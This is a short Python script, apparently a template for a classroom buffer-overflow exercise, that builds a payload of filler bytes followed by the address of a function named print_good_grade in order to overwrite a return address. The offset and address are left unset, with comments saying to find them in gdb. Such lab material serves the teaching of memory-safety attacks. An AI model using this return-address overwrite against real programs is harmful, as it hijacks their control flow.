import sys
from struct import pack

OFFSET = None           # bytes from start of input[] to return address — gdb
GOOD_GRADE_ADDR = None  # address of print_good_grade — `info address print_good_grade`

payload = b"A" * OFFSET
payload += pack("<I", GOOD_GRADE_ADDR)

sys.stdout.buffer.write(payload)